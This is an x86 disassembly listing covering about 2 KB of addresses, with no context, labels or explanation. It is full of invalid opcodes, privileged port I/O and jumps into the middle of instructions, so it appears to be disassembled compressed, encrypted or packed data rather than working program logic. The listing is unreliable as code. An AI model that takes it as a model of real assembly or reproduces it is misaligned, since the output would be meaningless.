  422d33:	xor    ebx,DWORD PTR [eax+0x495a6b19]
  422d39:	mov    dh,0x69
  422d3b:	ror    BYTE PTR [ebp+0x70bfe7b8],0x3c
  422d42:	cli    
  422d43:	call   0x2f5f:0x7eb82959
  422d4a:	dec    edi
  422d4b:	sub    esp,DWORD PTR [eax-0x2f]
  422d4e:	lea    esp,[ebp-0x1dba284f]
  422d54:	std    
  422d55:	mov    fs,WORD PTR [esi-0x554436d4]
  422d5b:	pop    esi
  422d5c:	pop    ss
  422d5d:	lods   eax,DWORD PTR ds:[esi]
  422d5e:	in     al,dx
  422d5f:	sub    ebp,DWORD PTR [ecx-0x480c61]
  422d65:	popa   
  422d66:	icebp  
  422d67:	cmp    al,0xec
  422d69:	rcl    BYTE PTR [esi],cl
  422d6b:	fsub   DWORD PTR [edx-0x21]
  422d6e:	test   eax,0x11611888
  422d73:	ror    DWORD PTR [edi-0x1c],cl
  422d76:	rol    DWORD PTR [bx+di+0x66],1
  422d7a:	mov    ebx,DWORD PTR [esi]
  422d7c:	cs int3 
  422d7e:	arpl   cx,ax
  422d80:	add    ecx,DWORD PTR [ebx]
  422d82:	cwde   
  422d83:	dec    edx
  422d84:	and    DWORD PTR [edi+0x6750b9c6],esi
  422d8a:	cmp    ch,BYTE PTR [edi]
  422d8c:	push   0x5c8f987e
  422d91:	xor    eax,0xff8fc686
  422d96:	int3   
  422d97:	mov    eax,0xa192cd4b
  422d9c:	jmp    0x422db3
  422d9e:	push   esi
  422d9f:	mov    al,0x3d
  422da1:	in     al,0x51
  422da3:	out    dx,eax
  422da4:	or     ebp,DWORD PTR ds:0x5b52834
  422daa:	push   0x7e3af522
  422daf:	mov    BYTE PTR [eax-0x44],dh
  422db2:	push   0xfbb6bf00
  422db7:	mov    eax,0x5401a917
  422dbc:	mov    cl,0x77
  422dbe:	test   BYTE PTR ds:0x6f7750de,dl
  422dc4:	aam    0xc9
  422dc6:	mov    esi,0x7032515b
  422dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dcc:	push   esp
  422dcd:	fild   DWORD PTR [edx]
  422dcf:	inc    ebx
  422dd0:	cmp    BYTE PTR [esi+esi*4],0x7
  422dd4:	enter  0xf557,0x8c
  422dd8:	and    ch,0xf0
  422ddb:	es xchg esp,eax
  422ddd:	stos   DWORD PTR es:[edi],eax
  422dde:	cmp    DWORD PTR [ecx+0x669cac54],edx
  422de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de5:	stc    
  422de6:	les    ebx,FWORD PTR [ecx+ecx*1-0x1aa45cce]
  422ded:	cli    
  422dee:	dec    edi
  422def:	int3   
  422df0:	dec    edx
  422df1:	push   0x3d540533
  422df6:	push   cs
  422df7:	inc    eax
  422df8:	jns    0x422e63
  422dfa:	leave  
  422dfb:	sub    BYTE PTR [ecx],bh
  422dfd:	jecxz  0x422dd0
  422dff:	fisttp DWORD PTR [edi+0x14]
  422e02:	jp     0x422da0
  422e04:	jl     0x422e65
  422e06:	call   0x910813d5
  422e0b:	retf   0xf68f
  422e0e:	mov    ah,0x9f
  422e10:	fcomip st,st(7)
  422e12:	rol    DWORD PTR [ecx+0x26b641cc],cl
  422e18:	mov    edx,0xd16cc495
  422e1d:	cmp    al,0x84
  422e1f:	loopne 0x422e68
  422e21:	mov    bh,BYTE PTR [esi-0xf3c6e7d]
  422e27:	(bad)  
  422e28:	outs   dx,BYTE PTR ds:[esi]
  422e29:	mov    ebx,0x648c8dda
  422e2e:	inc    edi
  422e2f:	xchg   ecx,eax
  422e30:	xchg   esi,eax
  422e31:	jae    0x422e47
  422e33:	jne    0x422e39
  422e35:	cmp    edx,DWORD PTR [edi]
  422e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e38:	mov    eax,0x9acbc2f1
  422e3d:	xlat   BYTE PTR ds:[ebx]
  422e3e:	mov    edx,0x38d8ce72
  422e43:	or     DWORD PTR [edi-0x23],eax
  422e46:	ins    DWORD PTR es:[edi],dx
  422e47:	daa    
  422e48:	sub    eax,0x510eb403
  422e4d:	sub    BYTE PTR [esi+0x0],bl
  422e53:	add    BYTE PTR [eax],al
  422e55:	add    BYTE PTR [eax],al
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi-0x4796013c]
  422e68:	out    0xa9,eax
  422e6a:	iret   
  422e6b:	test   al,0x1
  422e6d:	add    ch,bh
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    cl,ch
  422e73:	repnz cmp eax,0x34585c04
  422e79:	dec    eax
  422e7a:	xchg   edx,eax
  422e7b:	or     edx,ebp
  422e7d:	inc    eax
  422e7e:	das    
  422e7f:	scas   al,BYTE PTR es:[edi]
  422e80:	dec    ebp
  422e81:	mov    cl,0xcf
  422e83:	(bad)  
  422e84:	ficomp DWORD PTR [edi-0x4f894614]
  422e8a:	mov    BYTE PTR [eax],ch
  422e8c:	push   ebx
  422e8d:	int3   
  422e8e:	leave  
  422e8f:	test   al,0xa
  422e91:	or     DWORD PTR [ecx+0x7c5e1d6e],0x5c
  422e98:	xor    al,0x64
  422e9a:	(bad)  
  422e9b:	mov    esi,0xf14d7464
  422ea0:	cli    
  422ea1:	ds scas eax,DWORD PTR es:[edi]
  422ea3:	ret    0x55f4
  422ea6:	sub    al,0x56
  422ea8:	into   
  422ea9:	imul   edx,DWORD PTR [ebx+0x36c3d59c],0xe29af4f5
  422eb3:	sbb    esp,DWORD PTR [ebx]
  422eb5:	mov    eax,ds:0xe6cfdda4
  422eba:	outs   dx,BYTE PTR ds:[esi]
  422ebb:	sahf   
  422ebc:	(bad)  
  422ebd:	pop    ebx
  422ebe:	mov    bl,0x9c
  422ec0:	pop    esi
  422ec1:	adc    al,ch
  422ec3:	scas   al,BYTE PTR es:[edi]
  422ec4:	and    esp,ecx
  422ec6:	and    DWORD PTR [edx],esi
  422ec8:	call   0x8837:0xb9343ed4
  422ecf:	or     al,ch
  422ed1:	mov    dh,0xf1
  422ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed4:	fcom   DWORD PTR [edi-0xa490e95]
  422eda:	inc    esi
  422edb:	pop    esp
  422edc:	sahf   
  422edd:	push   ecx
  422ede:	ret    
  422edf:	cmc    
  422ee0:	mov    ch,0x42
  422ee2:	push   eax
  422ee3:	lods   eax,DWORD PTR ds:[esi]
  422ee4:	push   esp
  422ee5:	sbb    ch,ah
  422ee7:	mov    dl,0x32
  422ee9:	lds    ebx,FWORD PTR [eax-0x6c]
  422eec:	aas    
  422eed:	inc    edi
  422eee:	jne    0x422e75
  422ef0:	call   0xe094:0xd645bbf6
  422ef7:	or     DWORD PTR [ecx],ecx
  422ef9:	sahf   
  422efa:	mov    ch,0x5a
  422efc:	mov    ecx,0x979cbe58
  422f01:	pop    edx
  422f02:	jnp    0x422f40
  422f04:	lock add DWORD PTR [ecx],eax
  422f07:	pop    ds
  422f08:	push   es
  422f09:	jbe    0x422ea0
  422f0b:	pop    edx
  422f0c:	fistp  QWORD PTR [eax-0x19]
  422f0f:	mov    eax,0x17350cbf
  422f14:	or     edx,ebp
  422f16:	punpckhbw mm0,QWORD PTR [edx]
  422f19:	add    sp,0x2340
  422f1e:	cmp    BYTE PTR [eax],bl
  422f20:	push   ebp
  422f21:	mov    ecx,ebx
  422f23:	and    eax,0x498f33de
  422f28:	jne    0x422f27
  422f2a:	fimul  DWORD PTR [edx]
  422f2c:	in     al,0xb8
  422f2e:	jns    0x422f12
  422f30:	adc    dh,BYTE PTR [edi+0x1d]
  422f33:	mov    ebp,0x618d2444
  422f38:	xchg   esp,eax
  422f39:	pop    ebp
  422f3a:	retf   0x7064
  422f3d:	pop    ds
  422f3e:	add    bl,BYTE PTR [eax+0x4ef0f44e]
  422f44:	sbb    DWORD PTR [eax+0xd],edx
  422f47:	xor    DWORD PTR [edi],eax
  422f49:	sub    DWORD PTR [edx],esi
  422f4b:	adc    al,0xfa
  422f4d:	fisubr WORD PTR [ecx]
  422f4f:	imul   ecx,DWORD PTR [ecx],0xffffffd9
  422f52:	xor    al,0x9b
  422f54:	mov    edx,0x452787b0
  422f59:	sbb    al,0x34
  422f5b:	es push ebp
  422f5d:	xor    dl,ch
  422f5f:	adc    ebp,eax
  422f61:	outs   dx,DWORD PTR ds:[esi]
  422f62:	shl    esp,cl
  422f64:	out    dx,eax
  422f65:	jo     0x422faf
  422f67:	adc    ebp,DWORD PTR [esi]
  422f69:	pop    ebp
  422f6a:	lahf   
  422f6b:	inc    edi
  422f6c:	in     eax,0xcb
  422f6e:	mov    edx,0xd3e6352f
  422f73:	fwait
  422f74:	xchg   esp,eax
  422f75:	xor    al,BYTE PTR [edi]
  422f77:	in     al,dx
  422f78:	imul   ebp,DWORD PTR [esp+edx*4-0x63],0xffffff8f
  422f7d:	icebp  
  422f7e:	mov    ds:0xadd6becd,eax
  422f83:	inc    DWORD PTR [edx+eax*1]
  422f86:	inc    esp
  422f87:	nop
  422f88:	mov    ds:0xe274f49e,eax
  422f8d:	push   esi
  422f8e:	cmp    ecx,DWORD PTR [edx-0x7]
  422f91:	push   cs
  422f92:	shl    DWORD PTR [ecx+eiz*1+0x73703003],1
  422f99:	inc    eax
  422f9a:	push   ecx
  422f9b:	retf   0x74c
  422f9e:	call   0x9fbedf5b
  422fa3:	(bad)  
  422fa4:	repz sub al,BYTE PTR [ecx+edi*2-0x136b8413]
  422fac:	loope  0x422f96
  422fae:	pop    ebp
  422faf:	outs   dx,BYTE PTR ds:[esi]
  422fb0:	xchg   esi,eax
  422fb1:	mov    esp,0x1e43992c
  422fb6:	lahf   
  422fb7:	scas   al,BYTE PTR es:[edi]
  422fb8:	pop    eax
  422fb9:	inc    eax
  422fba:	add    ch,BYTE PTR [ebp-0x61]
  422fbd:	mov    ebx,0xa6105e41
  422fc2:	test   BYTE PTR [ecx-0x25],al
  422fc5:	xor    al,bl
  422fc7:	loop   0x422f8e
  422fc9:	pop    ebp
  422fca:	or     al,BYTE PTR ds:0xf80718cc
  422fd0:	dec    ebx
  422fd1:	push   esp
  422fd2:	nop
  422fd3:	(bad)  
  422fd4:	cli    
  422fd5:	(bad)  
  422fd6:	outs   dx,BYTE PTR ds:[esi]
  422fd7:	das    
  422fd8:	in     eax,0xa2
  422fda:	repz mov al,0x69
  422fdd:	cmp    ebp,DWORD PTR [ecx+0x67]
  422fe0:	xor    BYTE PTR [ebx],bl
  422fe2:	dec    ecx
  422fe3:	test   BYTE PTR [edi+0x4bfddbbb],cl
  422fe9:	fcom   QWORD PTR [ecx-0x4b191253]
  422fef:	pop    esp
  422ff0:	leave  
  422ff1:	or     eax,0x7a7df8b5
  422ff6:	xor    cl,bh
  422ff8:	dec    eax
  422ff9:	out    dx,eax
  422ffa:	mov    al,cs:0xc71954b6
  423000:	adc    dl,ah
  423002:	xchg   ebx,eax
  423003:	retf   
  423004:	xchg   esi,eax
  423005:	mov    ch,0xe2
  423007:	stos   BYTE PTR es:[edi],al
  423008:	enter  0xbd9e,0x91
  42300c:	in     al,0x2d
  42300e:	fnclex 
  423010:	lock add al,0xcf
  423013:	pop    ss
  423014:	and    ebp,DWORD PTR [esi-0x3f]
  423017:	mov    ds:0xcac68094,al
  42301c:	add    bh,BYTE PTR [ecx-0x403ef37a]
  423022:	push   ss
  423023:	push   es
  423024:	std    
  423025:	mov    al,0xa0
  423027:	aad    0x24
  423029:	inc    edi
  42302a:	retf   0x677b
  42302d:	pop    ds
  42302e:	pusha  
  42302f:	cmp    cl,BYTE PTR [eax-0x6e4595ae]
  423035:	stc    
  423036:	sbb    BYTE PTR ds:0xb913879d,0xd7
  42303d:	or     DWORD PTR [edi+0x62],eax
  423040:	pop    ebx
  423041:	xchg   edx,eax
  423042:	cmp    ch,0xcb
  423045:	in     eax,0x15
  423047:	ja     0x423063
  423049:	iret   
  42304a:	dec    edx
  42304b:	ins    BYTE PTR es:[edi],dx
  42304c:	jg     0x423094
  42304e:	data16 enterw 0x2371,0xd3
  423054:	adc    BYTE PTR [eax+0x6b],dl
  423057:	jo     0x422fe9
  423059:	xchg   esi,edx
  42305b:	push   eax
  42305c:	cmp    al,BYTE PTR ds:0xed8f7c6b
  423062:	sti    
  423063:	push   0x6f10fccd
  423068:	and    BYTE PTR [edx+0x1dc25968],al
  42306e:	dec    esp
	...
  423077:	add    BYTE PTR [eax],al
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	jo     0x4230ac
  423088:	mov    bl,0x46
  42308a:	int3   
  42308b:	stos   BYTE PTR es:[edi],al
  42308c:	add    DWORD PTR [eax],eax
  42308e:	std    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    dh,bh
  423093:	fcmovnu st,st(4)
  423095:	arpl   WORD PTR [edx],dx
  423097:	cwde   
  423098:	xor    DWORD PTR [ebp+0x78413521],esp
  42309e:	pop    ebx
  42309f:	in     eax,0x2c
  4230a1:	icebp  
  4230a2:	add    DWORD PTR [edi],esi
  4230a4:	(bad)  
  4230a5:	fadd   st(7),st
  4230a7:	inc    edi
  4230a8:	or     BYTE PTR [ecx+eiz*2+0x60cd1b59],0x65
  4230b0:	popa   
  4230b1:	add    eax,0xfecf7615
  4230b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230b7:	or     al,0xb9
  4230b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ba:	sbb    al,0xfe
  4230bc:	inc    edi
  4230bd:	cwde   
  4230be:	sbb    al,cl
  4230c0:	call   0x5fa8d348
  4230c5:	mov    bl,0x52
  4230c7:	lods   al,BYTE PTR ds:[esi]
  4230c8:	pop    ebx
  4230c9:	(bad)  
  4230ca:	fwait
  4230cb:	inc    ebx
  4230cc:	pop    esp
  4230cd:	mov    edi,0x2fc7951c
  4230d2:	lea    edi,[esi+0x1]
  4230d5:	nop
  4230d6:	in     eax,dx
  4230d7:	mov    WORD PTR [edx],cs
  4230d9:	mov    eax,0x912053d4
  4230de:	outs   dx,BYTE PTR ds:[esi]
  4230df:	test   BYTE PTR [edi],dl
  4230e1:	imul   esi,DWORD PTR [edi-0x53],0x2baba0f9
  4230e8:	push   es
  4230e9:	test   al,0x70
  4230eb:	jl     0x423151
  4230ed:	and    eax,0xd359d6ff
  4230f2:	sub    eax,0x6ebafdb5
  4230f7:	dec    edx
  4230f8:	inc    edi
  4230f9:	sub    BYTE PTR [ebx],dh
  4230fb:	dec    edx
  4230fc:	ins    DWORD PTR es:[edi],dx
  4230fd:	mov    dl,0xa4
  4230ff:	push   es
  423100:	lahf   
  423101:	jge    0x4230dc
  423103:	mov    esp,0x2ca01c0e
  423108:	and    al,0xff
  42310a:	fs sub ebp,ebx
  42310d:	fist   WORD PTR [ebp+0x1f8f3362]
  423113:	in     eax,0xa6
  423115:	into   
  423116:	dec    eax
  423117:	and    BYTE PTR [edx+0x7c],dl
  42311a:	xor    BYTE PTR [edi],0x48
  42311d:	cmovp  edi,DWORD PTR [ecx]
  423120:	cmp    DWORD PTR [esi+0x3771df7c],ecx
  423126:	pop    ebx
  423127:	jo     0x4230ca
  423129:	fdiv   DWORD PTR [esi-0x5b]
  42312c:	outs   dx,DWORD PTR ds:[esi]
  42312d:	in     eax,dx
  42312e:	or     eax,0xddcc122
  423133:	out    0x13,eax
  423135:	call   0xa853c
  42313a:	das    
  42313b:	arpl   WORD PTR ds:0xc866d9c9,bx
  423141:	lahf   
  423142:	cmp    ch,BYTE PTR [esi+0x6074e6cf]
  423148:	and    ch,dh
  42314a:	dec    edi
  42314b:	fist   DWORD PTR [eax+0x18c6c1fa]
  423151:	js     0x423110
  423153:	rcr    DWORD PTR es:[ebp+eiz*2-0x3227923f],1
  42315b:	mov    ecx,0xcdf4aa8d
  423160:	icebp  
  423161:	leave  
  423162:	xlat   BYTE PTR ds:[ebx]
  423163:	and    ebp,DWORD PTR [ecx+0x36ad22c8]
  423169:	jg     0x42314d
  42316b:	in     al,dx
  42316c:	repz sub bl,BYTE PTR [edi-0x69d3e62d]
  423173:	jnp    0x423120
  423175:	bnd ja 0x4231a0
  423178:	pop    edx
  423179:	aas    
  42317a:	jge    0x423116
  42317c:	push   esp
  42317d:	aad    0x71
  42317f:	jbe    0x423133
  423181:	sbb    eax,0xb1c8b2ff
  423186:	pop    esp
  423187:	jns    0x423174
  423189:	sub    dl,bl
  42318b:	sub    al,0xe7
  42318d:	jp     0x4231d5
  42318f:	xchg   esi,eax
  423190:	repz adc eax,0x2d9ef6d9
  423196:	icebp  
  423197:	out    0xe2,eax
  423199:	jae    0x4231d0
  42319b:	mov    ds:0x27109201,al
  4231a0:	call   0xbd12e77c
  4231a5:	sub    edi,DWORD PTR [ecx-0x177f14f9]
  4231ab:	lea    ecx,[edx-0x4]
  4231ae:	les    ebx,FWORD PTR [ebp-0x4c]
  4231b1:	out    0x6b,eax
  4231b3:	cwde   
  4231b4:	out    0xf4,al
  4231b6:	std    
  4231b7:	jg     0x42315d
  4231b9:	xchg   esi,eax
  4231ba:	das    
  4231bb:	cmp    eax,0x96629d66
  4231c0:	pcmpeqd mm3,QWORD PTR [edi-0x4d2b3ea]
  4231c7:	xlat   BYTE PTR ds:[ebx]
  4231c8:	dec    ebx
  4231c9:	xchg   edx,eax
  4231ca:	fwait
  4231cb:	shl    DWORD PTR [ebp-0xf],cl
  4231ce:	test   al,0x2c
  4231d0:	cmc    
  4231d1:	imul   edx,DWORD PTR [ecx],0xffffffb8
  4231d4:	and    ebx,ebp
  4231d6:	adc    al,0x11
  4231d8:	retf   
  4231d9:	hlt    
  4231da:	test   BYTE PTR [ebx+0x735d8c1d],ah
  4231e0:	mov    esp,0x6a81acfd
  4231e5:	outs   dx,BYTE PTR ds:[esi]
  4231e6:	jo     0x423220
  4231e8:	pusha  
  4231e9:	cdq    
  4231ea:	(bad)  
  4231eb:	shl    DWORD PTR [esi+0x83a5037],cl
  4231f1:	cdq    
  4231f2:	repz inc ebp
  4231f4:	imul   eax,DWORD PTR [edi+ecx*8+0x2e],0xccc4afeb
  4231fc:	sbb    cl,BYTE PTR [ebp+0x207bc7be]
  423202:	bound  ebx,QWORD PTR [ecx]
  423204:	xchg   ebx,eax
  423205:	push   esp
  423206:	jl     0x423200
  423208:	sti    
  423209:	add    al,0x29
  42320b:	cmp    ah,BYTE PTR [eax+edi*2]
  42320e:	cwde   
  42320f:	mov    al,ds:0x6bc2dc6d
  423214:	pop    ds
  423215:	dec    esp
  423216:	push   ebp
  423217:	jno    0x423283
  423219:	xor    DWORD PTR [ebp-0x3bf22340],ebx
  42321f:	call   0xf416b7b7
  423224:	inc    ecx
  423225:	mov    ebx,0xf263d05b
  42322a:	mov    ds:0xb879b8e5,al
  42322f:	bound  ecx,QWORD PTR [eax+0x414f4008]
  423235:	add    BYTE PTR [esi+0x76],cl
  423238:	outs   dx,DWORD PTR ds:[esi]
  423239:	sahf   
  42323a:	xor    eax,0x1302f6ec
  42323f:	lods   al,BYTE PTR ds:[esi]
  423240:	popf   
  423241:	xor    edi,DWORD PTR [edx]
  423243:	es ja  0x423245
  423246:	mov    cl,0x4d
  423248:	mov    ds,WORD PTR [edi-0x12]
  42324b:	add    al,BYTE PTR [ebx]
  42324d:	cmp    esp,DWORD PTR ds:0x2c5c3c24
  423253:	mov    edx,0xbc56f7e9
  423258:	adc    BYTE PTR [ecx],0x94
  42325b:	fsubr  DWORD PTR [ebx-0x80]
  42325e:	mov    ch,0xe9
  423260:	add    al,0x33
  423262:	aam    0xc9
  423264:	jmp    0x4232ce
  423266:	cdq    
  423267:	jle    0x423277
  423269:	jbe    0x4232cd
  42326b:	dec    ebx
  42326c:	adc    al,0xa
  42326e:	in     al,0x32
  423270:	shr    DWORD PTR [esi+0x44],0xf5
  423274:	lds    ebp,FWORD PTR [ecx+ecx*4+0x4c]
  423278:	or     ah,BYTE PTR [ebx-0x21ecec25]
  42327e:	adc    ah,BYTE PTR [esi+0x44c38a85]
  423284:	mov    esp,0xb5750d2a
  423289:	ret    
  42328a:	add    esp,DWORD PTR ds:0x4040d2
	...
  423298:	add    BYTE PTR [eax],al
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	outs   dx,BYTE PTR ds:[esi]
  4232a7:	imul   esp,DWORD PTR [esi-0x6b],0xffffffc9
  4232ab:	lods   al,BYTE PTR ds:[esi]
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	std    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [esi-0x4e682fc3],bh
  4232b7:	cwde   
  4232b8:	mov    eax,0x8dc08cc2
  4232bd:	fwait
  4232be:	test   BYTE PTR [ebx],bh
  4232c0:	xchg   edi,eax
  4232c1:	pop    eax
  4232c2:	mov    ss,WORD PTR [edi+0x1b]
  4232c5:	out    dx,al
  4232c6:	pop    ds
  4232c7:	call   0x59f5:0x4c6fc15a
  4232ce:	imul   edx,edi,0x1b
  4232d1:	out    dx,eax
  4232d2:	add    BYTE PTR [eax+0x2233698e],0x4f
  4232d9:	sub    eax,0x33fb9e83
  4232de:	and    BYTE PTR [eax-0x3f],cl
  4232e1:	(bad)  
  4232e2:	adc    DWORD PTR [edi+0x4f],eax
  4232e5:	cmc    
  4232e6:	sbb    cl,bl
  4232e8:	xor    esp,0xffffffbb
  4232eb:	mov    edi,0x8a3ac439
  4232f0:	(bad)  
  4232f1:	(bad)  
  4232f3:	adc    edi,eax
  4232f5:	jge    0x42335b
  4232f7:	into   
  4232f8:	loope  0x423372
  4232fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232fb:	or     BYTE PTR [edx+0x7],ah
  4232fe:	mov    ds:0x26c84a9,al
  423303:	out    dx,eax
  423304:	je     0x42336d
  423306:	daa    
  423307:	sub    BYTE PTR [eax-0x623ee76d],dl
  42330d:	adc    al,0x91
  42330f:	adc    eax,0x2e45ddc0
  423314:	mov    ds:0x8ba41f40,eax
  423319:	sbb    DWORD PTR [edi+0x50b4c847],esp
  42331f:	cs mov al,0xf1
  423322:	sbb    BYTE PTR [edi+0x5e],ch
  423325:	shl    BYTE PTR [edx-0x3d3104b1],0x47
  42332c:	pop    ebp
  42332d:	mov    WORD PTR [esi],gs
  42332f:	jno    0x423321
  423331:	sti    
  423332:	jp     0x42337f
  423334:	or     BYTE PTR ds:0x580a,0x4c
  42333a:	sub    eax,0xcd19e2e8
  42333f:	inc    ecx
  423340:	or     al,0xdc
  423342:	or     ah,0x3f
  423345:	mov    esp,DWORD PTR [edx+0x46c407a]
  42334b:	sub    esp,edx
  42334d:	stos   DWORD PTR es:[edi],eax
  42334e:	ror    ebp,1
  423350:	xchg   edx,eax
  423351:	lds    esp,FWORD PTR [esi+0x49]
  423354:	mov    esp,0x78200553
  423359:	sar    DWORD PTR [edi+ebp*1+0x655e48c6],0x14
  423361:	jmp    0x42333f
  423363:	das    
  423364:	jmp    0xbabfc52b
  423369:	or     BYTE PTR [ecx+0x4b4565dd],bh
  42336f:	mov    ebp,DWORD PTR [eax+0x6c]
  423372:	aad    0xed
  423374:	pop    esi
  423375:	xchg   BYTE PTR [ebp+0x5],dl
  423378:	pop    ds
  423379:	mov    BYTE PTR [ebx+0x1dc9781],cl
  42337f:	lahf   
  423380:	cmp    al,bl
  423382:	lods   eax,DWORD PTR ds:[esi]
  423383:	xor    eax,0xb96ad0c
  423388:	(bad)  
  423389:	pop    esi
  42338a:	cmp    al,0x3b
  42338c:	fwait
  42338d:	push   ebp
  42338e:	or     BYTE PTR [eax],ah
  423390:	repnz push esp
  423392:	mov    BYTE PTR [ecx-0x6cc9fca1],al
  423398:	mov    ecx,0x3b075c6f
  42339d:	mov    dh,0x9e
  42339f:	push   eax
  4233a0:	xchg   edi,eax
  4233a1:	mov    bl,0xec
  4233a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233a4:	lea    ebp,[ebx+0x41]
  4233a7:	pop    edx
  4233a8:	es pop ebx
  4233aa:	cdq    
  4233ab:	inc    esp
  4233ac:	call   0xf2c803ef
  4233b1:	gs (bad) 
  4233b3:	fnstcw WORD PTR [edi]
  4233b5:	addr16 aam 0x26
  4233b8:	jne    0x423356
  4233ba:	xchg   ebp,eax
  4233bb:	mov    ds:0x5d4a687b,eax
  4233c0:	dec    ebx
  4233c1:	test   DWORD PTR [ebx+esi*4+0x7c],edx
  4233c5:	idiv   BYTE PTR [edx-0x20]
  4233c8:	inc    ecx
  4233c9:	inc    eax
  4233ca:	scas   al,BYTE PTR es:[edi]
  4233cb:	test   edx,esp
  4233cd:	jg     0x42340f
  4233cf:	xchg   esp,eax
  4233d0:	mov    eax,ds:0x3e9d096f
  4233d5:	leave  
  4233d6:	pop    ebp
  4233d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233d8:	shr    dl,0xb0
  4233db:	ror    dl,cl
  4233dd:	(bad)  
  4233de:	xor    DWORD PTR gs:[edi+0x15a734c4],ebx
  4233e5:	cs mov esi,0x68b9fd04
  4233eb:	mov    bl,0xc0
  4233ed:	mov    ecx,DWORD PTR [ecx-0x33f1c1e]
  4233f3:	cmc    
  4233f4:	test   dl,ah
  4233f6:	ja     0x423459
  4233f8:	idiv   BYTE PTR [ebx+0x669930e3]
  4233fe:	add    BYTE PTR [esi-0x45],ch
  423401:	cwde   
  423402:	(bad)  
  423403:	lds    eax,FWORD PTR [ecx+ebp*1+0x6c07736]
  42340a:	push   eax
  42340b:	iret   
  42340c:	mov    bl,0x97
  42340e:	jge    0x4233e7
  423410:	inc    eax
  423411:	cwde   
  423412:	bound  ebx,QWORD PTR [esi]
  423414:	sub    ecx,DWORD PTR [edi-0xbf72613]
  42341a:	sbb    edx,DWORD PTR ds:0x1b5cf69d
  423420:	mov    eax,ds:0x9b359369
  423425:	test   al,0xf
  423427:	inc    edi
  423428:	xor    BYTE PTR [edx+0xe2f790c],bh
  42342e:	je     0x423461
  423430:	icebp  
  423431:	mov    BYTE PTR [esi+0x14a4bbf8],al
  423437:	dec    esp
  423438:	adc    bh,BYTE PTR [eax-0x18de9f9e]
  42343e:	repnz scas al,BYTE PTR es:[edi]
  423440:	xor    BYTE PTR [ecx+0x345f4535],ch
  423446:	jg     0x42348e
  423448:	xchg   ecx,eax
  423449:	mov    DWORD PTR [ebp+0x5f5faab8],ebx
  42344f:	fbld   TBYTE PTR [edi+0x224454b4]
  423455:	dec    ebp
  423456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423457:	dec    eax
  423458:	imul   esp,DWORD PTR [ebx+0x50],0x13
  42345c:	fisubr WORD PTR [edi]
  42345e:	adc    BYTE PTR [ecx-0xf],ch
  423461:	cmp    ebp,eax
  423463:	adc    eax,0x47e78565
  423468:	add    DWORD PTR ds:0x32ac941d,edx
  42346e:	sbb    dh,ah
  423470:	mov    esi,0xca2a478d
  423475:	test   DWORD PTR [ebx+0x25],eax
  423478:	xchg   ebx,eax
  423479:	aaa    
  42347a:	cli    
  42347b:	repnz lock ss das 
  42347f:	dec    esi
  423480:	int3   
  423481:	mov    BYTE PTR [ecx+0x7c],al
  423484:	dec    ecx
  423485:	mov    dl,0x21
  423487:	dec    edi
  423488:	and    eax,0xb2240ebd
  42348d:	adc    ah,BYTE PTR [ecx]
  42348f:	and    eax,DWORD PTR [eax]
  423491:	ja     0x4234d8
  423493:	icebp  
  423494:	cmp    eax,0x398d31e6
  423499:	fidiv  WORD PTR [edx+0x77]
  42349c:	jl     0x42342c
  42349e:	pop    edx
  42349f:	imul   esi,DWORD PTR [eax+0x742f2c71],0x55
  4234a6:	pop    ds
  4234a7:	imul   esp,DWORD PTR [eax-0x3628da68],0x454b
	...
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	xor    al,0x25
  4234c8:	bound  ebx,QWORD PTR [esi+eax*8-0x52]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	std    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [edx-0x67],bl
  4234d4:	mov    dh,0x17
  4234d6:	out    dx,al
  4234d7:	push   ecx
  4234d8:	fadd   st(7),st
  4234da:	dec    esp
  4234db:	sub    al,ch
  4234dd:	sahf   
  4234de:	in     al,dx
  4234df:	inc    ebx
  4234e0:	cwde   
  4234e1:	aaa    
  4234e2:	jecxz  0x423472
  4234e4:	and    al,0x64
  4234e6:	xor    bh,BYTE PTR [esi-0x1a808f8e]
  4234ec:	pop    ss
  4234ed:	fimul  WORD PTR [edx+0x8c074d0]
  4234f3:	push   ebp
  4234f4:	and    dh,dl
  4234f6:	sti    
  4234f7:	jnp    0x423537
  4234f9:	xchg   ecx,eax
  4234fa:	cmp    al,0xe4
  4234fc:	dec    ebp
  4234fd:	push   edi
  4234fe:	push   ss
  4234ff:	test   eax,0x1c45a181
  423504:	pop    ss
  423505:	xchg   esi,eax
  423506:	xor    DWORD PTR [edi],edi
  423508:	sbb    eax,0xb5d7bae8
  42350d:	fcomp  QWORD PTR [eax+eax*8+0x44ccbf12]
  423514:	hlt    
  423515:	xchg   ecx,eax
  423516:	lods   eax,DWORD PTR ds:[esi]
  423517:	rol    edi,cl
  423519:	aaa    
  42351a:	(bad)  
